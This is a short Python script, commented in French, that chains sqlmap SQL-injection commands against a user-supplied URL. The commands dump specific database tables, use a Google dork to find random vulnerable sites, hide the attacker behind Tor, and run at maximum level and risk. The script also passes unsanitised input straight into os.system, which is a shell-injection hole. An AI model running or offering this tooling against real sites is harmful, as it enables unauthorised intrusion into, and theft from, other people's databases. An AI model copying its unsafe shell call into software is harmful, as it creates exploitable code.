import os

# Demander à l'utilisateur d'entrer un site à tester pour l'injection SQL
site = input("Entrez l'URL à tester pour l'injection SQL: ")

# Exécuter un test d'injection SQL sur le site spécifié par l'utilisateur
os.system(f'sqlmap -u "{site}" --batch')

# Automatiser le processus de test en utilisant un fichier d'enregistrement
os.system('sqlmap -r request.txt --batch')

# Cibler une base de données spécifique, une table et une colonne
os.system(f'sqlmap -u "{site}" -D dbname -T tablename -C columnname --dump')

# Automatiser la recherche d'injection SQL en utilisant Google Dork
os.system(f'sqlmap -g "inurl:index.php?id=" --batch')

# Se connecter via Tor pour protéger l'identité
os.system(f'sqlmap -u "{site}" --tor')

# Utiliser une méthode d'authentification spécifique
os.system(f'sqlmap -u "{site}" --auth-type="BASIC" --auth-cred="user:password" --batch')

# Tester les injections SQL sur une liste d'URL
os.system('sqlmap -m urls.txt --batch')

# Ignorer les erreurs de certificat SSL
os.system(f'sqlmap -u "{site}" --ssl --ignore-ssl-errors')

# Utiliser un proxy pour se connecter
os.system(f'sqlmap -u "{site}" --proxy="http://127.0.0.1:8080" --batch')

# Utiliser des threads pour accélérer le processus de test
os.system(f'sqlmap -u "{site}" --threads=5 --batch')

# Options avancées
os.system(f'sqlmap -u "{site}" --level=5 --risk=3 --cookie="user=admin;password=pass" --dbms="MySQL" --os="Linux" --current-user --current-db --hostname --timeout=10 --fresh-queries --hex --output-format="csv" --batch')
